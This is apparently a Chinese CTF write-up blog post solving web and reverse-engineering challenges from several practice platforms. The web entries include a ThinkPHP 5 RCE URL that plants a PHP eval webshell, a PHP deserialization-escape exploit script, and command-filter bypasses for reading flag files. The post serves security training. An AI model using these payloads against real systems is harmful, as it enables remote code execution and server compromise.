<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>CTF Writeup - 饱食终日，无所事事</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="饱食终日，无所事事"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="饱食终日，无所事事"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta description="尽量写吧"><meta property="og:type" content="blog"><meta property="og:title" content="CTF Writeup"><meta property="og:url" content="http://example.com/2019/10/05/writeup/"><meta property="og:site_name" content="饱食终日，无所事事"><meta property="og:description" content="尽量写吧"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/img/og_image.png"><meta property="article:published_time" content="2019-10-04T22:49:05.000Z"><meta property="article:modified_time" content="2020-10-03T07:48:53.724Z"><meta property="article:author" content="lll"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Writeup"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2019/10/05/writeup/"},"headline":"饱食终日，无所事事","image":["http://example.com/img/og_image.png"],"datePublished":"2019-10-04T22:49:05.000Z","dateModified":"2020-10-03T07:48:53.724Z","author":{"@type":"Person","name":"lll"},"description":"尽量写吧"}</script><link rel="canonical" href="http://example.com/2019/10/05/writeup/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="饱食终日，无所事事" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2019-10-04T22:49:05.000Z" title="2019-10-04T22:49:05.000Z">2019-10-05</time>发表</span><span class="level-item"><time dateTime="2020-10-03T07:48:53.724Z" title="2020-10-03T07:48:53.724Z">2020-10-03</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/CTF/">CTF</a></span><span class="level-item">2 小时读完 (大约15854个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">CTF Writeup</h1><div class="content"><p>尽量写吧</p>
<a id="more"></a>

<h2 id="new-bugku"><a href="#new-bugku" class="headerlink" title="new bugku"></a><a target="_blank" rel="noopener" href="https://new.bugku.com/">new bugku</a></h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h4><p>提示备份了不少东西，用Githack得到flag。</p>
<h4 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h4><p>提示vim编辑器，想到源码泄露。输入swp，把1改成i，得到flag。</p>
<h4 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h4><p>正则匹配动态密文，提交时要使用session或者cookie</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://123.206.31.85:10020/&#x27;</span></span><br><span class="line">s = requests.session()</span><br><span class="line">r = s.get(url).text</span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line">ma = re.search(<span class="string">r&#x27;([a-z0-9]&#123;33&#125;)&#x27;</span>,r)</span><br><span class="line"><span class="comment"># print(ma)</span></span><br><span class="line">param = &#123;<span class="string">&#x27;key&#x27;</span>:ma.group(<span class="number">0</span>)&#125;</span><br><span class="line">r = s.get(url,params=param).text</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure>

<h2 id="安恒月赛"><a href="#安恒月赛" class="headerlink" title="安恒月赛"></a>安恒月赛</h2><h3 id="2020-4"><a href="#2020-4" class="headerlink" title="2020 4"></a>2020 4</h3><h4 id="Ezunserialize"><a href="#Ezunserialize" class="headerlink" title="Ezunserialize"></a>Ezunserialize</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">$data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(chr(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . chr(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">$data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;\0\0\0&#x27;</span>, chr(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . chr(<span class="number">0</span>), $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$a, $b</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $a;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b = <span class="string">&#x27;gqy&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $c = <span class="string">&#x27;a&#x27;</span>.<span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//flag.php</span></span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;c);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;nice&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A($_GET[<span class="string">&#x27;a&#x27;</span>],$_GET[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span></span><br><span class="line">$b = unserialize(read(write(serialize($a)))); </span><br></pre></td></tr></table></figure>

<p>处理过程中只要存在 \0\0\0 这6个字符就会替换成 chr(0)*chr(0) 这3个字符，反序列化过程中会根据长度进行反序列化，就有了逃逸的空间。</p>
<p>最后在 class C 中 toString 方法可以读取 flag.php，class B 中有 echo ，echo 一个 class C 的实例就可以输出了。</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http:<span class="comment">//183.129.189.60:10001/&#x27;</span></span><br><span class="line">a = &#x27;\\<span class="number">0</span>\\<span class="number">0</span>\\<span class="number">0</span>&#x27;*<span class="number">8</span></span><br><span class="line">b = &#x27;x<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;O:1:&quot;</span><span class="type">B</span><span class="string">&quot;:1:&#123;s:1:&quot;</span>b<span class="string">&quot;;O:1:&quot;</span><span class="type">C</span><span class="string">&quot;:1:&#123;s:1:&quot;</span><span class="built_in">c</span><span class="string">&quot;;s:8:&quot;</span>flag.php<span class="string">&quot;;&#125;&#125;&#125;&#x27;</span></span><br><span class="line"><span class="string">r = requests.get(url, params=&#123;&#x27;a&#x27;: a, &#x27;b&#x27;: b&#125;)</span></span><br><span class="line"><span class="string">print(r.url)</span></span><br><span class="line"><span class="string">print(r.text)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#O:1:&quot;</span><span class="type">A</span><span class="string">&quot;:2:&#123;s:8:&quot;</span>username<span class="string">&quot;;s:2:&quot;</span>un<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;O:1:&quot;</span><span class="type">B</span><span class="string">&quot;:1:&#123;s:1:&quot;</span>b<span class="string">&quot;;O:1:&quot;</span><span class="type">C</span><span class="string">&quot;:1:&#123;s:1:&quot;</span><span class="built_in">c</span><span class="string">&quot;;s:8:&quot;</span>flag.php<span class="string">&quot;;&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">#O:1:&quot;</span><span class="type">A</span><span class="string">&quot;:2:&#123;s:8:&quot;</span>username<span class="string">&quot;;s:2:&quot;</span>un<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:56:&quot;</span>x<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;O:1:&quot;</span><span class="type">B</span><span class="string">&quot;:1:&#123;s:1:&quot;</span>b<span class="string">&quot;;O:1:&quot;</span><span class="type">C</span><span class="string">&quot;:1:&#123;s:1:&quot;</span><span class="built_in">c</span><span class="string">&quot;;s:8:&quot;</span>flag.php<span class="string">&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task">攻防世界</a></h2><h3 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h3><h4 id="baby-web"><a href="#baby-web" class="headerlink" title="baby web"></a>baby web</h4><p>提示想想首页是哪个，访问index.php，跳转回 1.php，抓个包，repeater里重放，看到返回的header里面有flag</p>
<h4 id="php-rce"><a href="#php-rce" class="headerlink" title="php rce"></a>php rce</h4><p>thinkphp 5 的漏洞（<a target="_blank" rel="noopener" href="https://www.vulnspy.com/cn-thinkphp-5.x-rce/%EF%BC%89">https://www.vulnspy.com/cn-thinkphp-5.x-rce/）</a></p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:30031/?s=/index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func<span class="emphasis">_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=echo%20%27%3C?php%20@eval($_</span>POST[c]);?%3E%27%20%3E%20info.php</span><br></pre></td></tr></table></figure>

<p>写入一个shell到info.php，蚁剑连接，根目录下有flag</p>
<h4 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$s = <span class="string">&#x27;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#x27;</span>;</span><br><span class="line">$_o =  base64_decode(strrev(str_rot13($s)));</span><br><span class="line"><span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_o);$_0++)&#123; </span><br><span class="line">        </span><br><span class="line">        $_c=substr($_o,$_0,<span class="number">1</span>); </span><br><span class="line">        $__=ord($_c)<span class="number">-1</span>; </span><br><span class="line">        $_c=chr($__); </span><br><span class="line">        $_=$_.$_c;    </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">echo</span> strrev($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h4 id="csaw2013reversing2"><a href="#csaw2013reversing2" class="headerlink" title="csaw2013reversing2"></a>csaw2013reversing2</h4><p>执行发现flag是乱码，IDA打开，lpMem存着flag，如果执行到if里面程序就会退出，执行不到messagebox，同时if里面还有好像是处理flag的函数。所以想执行了这个函数之后再执行messagebox，这样就能打印出flag。拖进od，执行到程序设定的断点，nop掉最近的跳转（否则会执行之前的messagebox），接下来执行处理flag的函数，之后跳转到exitprocess，把这个跳转转到messagebox，一共有两个，都试一遍，在第二个得到flag。</p>
<h4 id="dmd-50"><a href="#dmd-50" class="headerlink" title="dmd-50"></a>dmd-50</h4><p>IDA，发现一串字符串 780438d5b6e29db0898bc4f0225935c0，是上面MD5加密得到的，拖去解密，是grape的两次MD5，再把grape加密一次，得到flag</p>
<h4 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h4><p>拖进OD，搜索字符串</p>
<h4 id="game"><a href="#game" class="headerlink" title="game"></a>game</h4><p>先运行一遍，像是玩一个游戏，把灯全点亮可以拿到flag。拖进OD，搜索字符串，看到 “done！the flag is”这里，找到跳转进来的位置，记下开始（push ebp）的地址（00C5E940），再到提示选项的地方（1，△），到这一段的开始（push ebp），改成jmp 00C5E940。</p>
<h4 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h4><p>IDA发现它把东西写入了 /tmp/flag.txt，在remove下断点，去flag.txt看，发现是假的= =。重新看，是一个简单的算法，用python写一下，得到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;c61b68366edeb7bdce3c6820314b7498&#x27;</span></span><br><span class="line">t = <span class="string">r&#x27;SharifCTF&#123;????????????????????????????????&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> v5 <span class="keyword">in</span> range(len(s)):</span><br><span class="line">	<span class="keyword">if</span> v5%<span class="number">2</span>:</span><br><span class="line">		v3 = <span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		v3 = <span class="number">-1</span></span><br><span class="line">	print(chr(ord(s[v5])+v3),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>最后要加上格式 SharifCTF{}</p>
<h4 id="Hello-Ctf"><a href="#Hello-Ctf" class="headerlink" title="Hello Ctf"></a>Hello Ctf</h4><p>运行，提示输入序列号，随便输，wrong。IDA里打开，发现一串字符串，向下看发现是把输入转换一下和之前的字符串比较，一致就会给出success。</p>
<h4 id="Open-Source"><a href="#Open-Source" class="headerlink" title="Open Source"></a>Open Source</h4><p>arg1 = 0xcafe arg2 = 25 arg3 = h4cky0u，打印得到flag</p>
<h4 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h4><p>IDA看一下，好像是把flag和随机数运算一下输出出来，shift F12得到flag</p>
<h4 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h4><p>IDA，在主函数的for循环处是算法部分，用c语言照着写下来。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[] = <span class="string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> t = <span class="number">28537194573619560L</span>L;</span><br><span class="line">    <span class="keyword">char</span> * tp = (<span class="keyword">char</span> *)&amp;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;s[i];i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,s[i]^tp[i%<span class="number">7</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h4><p>找到关键函数 sub400690，O:a2-1,o:a2+1,.:a3-1,0:a3+1，a1是地图，走出来把方向记下来，得到flag</p>
<h4 id="no-strings-attached"><a href="#no-strings-attached" class="headerlink" title="no strings attached"></a>no strings attached</h4><p>32位的elf文件，拖到linux虚拟机里执行一下，出错了。放进IDA，看到4各函数，最后一个把输入和解密之后的数据比较一下，一样会输出success。看一下汇编，decrypt函数运行后有 <code>mov [ebp+s2],eax</code>，解密后的flag在eax里。用gdb，b decrypt,r,n,i r,x/6sw $eax，以word（4字节），字符串形式显示6行，看到flag。</p>
<h4 id="python-trade"><a href="#python-trade" class="headerlink" title="python trade"></a>python trade</h4><p>找个在线的pyc反编译网站，看到一个编码算法，反着写出来，得到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">correct = <span class="string">&#x27;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">s</span>):</span></span><br><span class="line">	s = base64.b64decode(s)</span><br><span class="line">	res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">		x = c<span class="number">-16</span></span><br><span class="line">		res += chr(x^<span class="number">32</span>)</span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line">print(decode(correct))</span><br></pre></td></tr></table></figure>

<h4 id="Shuffle"><a href="#Shuffle" class="headerlink" title="Shuffle"></a>Shuffle</h4><p>IDA看一下，是一个字符数组，转换成char就拿到了flag</p>
<h4 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple unpack"></a>simple unpack</h4><p>IDA二进制方式打开，搜索flag，或者用upx脱壳后再打开，可以直接看到flag。</p>
<h2 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a><a target="_blank" rel="noopener" href="https://buuoj.cn/">BUUCTF</a></h2><h3 id="web-2"><a href="#web-2" class="headerlink" title="web"></a>web</h3><h4 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h4><p>提示有源文件，<code>index.php.bak</code>，然后就是一个弱类型，<code>key=123</code>。</p>
<h4 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h4><p>查看源代码，说UTF-8很重要。输入4，1337，提示只能输入一个字符。查一下Unicode，<a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/">Unicode - Compart</a>，随便找一个比1337大的，取UTF8编码，比如<code>0xF0 0x90 0xA1 0x9F</code>。输入<code>4, %F0%90%A1%9F</code>，得到flag</p>
<h4 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h4><p>看到img=…，可能存在文件包含，base64解密两次，ASCII Hex解密一次，得到555.pnf0？换成index.php加密回去，在img标签的src里看见base64之后的源码。</p>
<p>cmd参数可以执行系统命令，过滤了常用的读取文件的命令。可以使用ca/t f/lag，也可以用sort flag.</p>
<p>下面是一个强类型的md5碰撞，使用fastcoll，<code>.\fastcoll_v1.0.0.5.exe -o 1.txt 2.txt</code>，生成两个md5内容相同的文件。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">r&#x27;C:\Users\&lt;user&gt;\Desktop\1.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f1:</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">r&#x27;C:\Users\&lt;user&gt;\Desktop\2.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">        a = f1.read()</span><br><span class="line">        b = f2.read()</span><br><span class="line">        url = <span class="string">&#x27;http://9c2738e0-05e7-4936-839d-286bde014ef5.node3.buuoj.cn/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=&#x27;</span></span><br><span class="line">        cmd = <span class="string">r&#x27;sort /flag&#x27;</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;a&#x27;</span>: a,<span class="string">&#x27;b&#x27;</span>: b&#125;</span><br><span class="line">        r = requests.post(url+cmd, data=data)</span><br><span class="line">        print(r.text)</span><br></pre></td></tr></table></figure>

<p>读取文件时要用绝对路径，否则会找不到文件，原因不明。</p>
<h4 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h4><p>随便输点什么，看到提示 SSTI。</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">1</span>+<span class="number">1</span>&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>能看到结果，直接 tplmap，得到flag。</p>
<h4 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">$function = @$_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;function&#x27;</span>] = $function;</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode($_GET[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>从后往前看，假设文件在<code>./flag.php</code>，目的是执行<code>file_get_contents(&#39;./flag.php&#39;)</code>，usrinfo来自filter和反序列化的<code>$_SESSION</code>，filter删除特定的字符串。由于是先反序列化后过滤，本来不属于变量的一部分的字符串可能被收进变量中。extract可以用于覆盖变量。</p>
<p>没有成功，原来文件不是flag.php。</p>
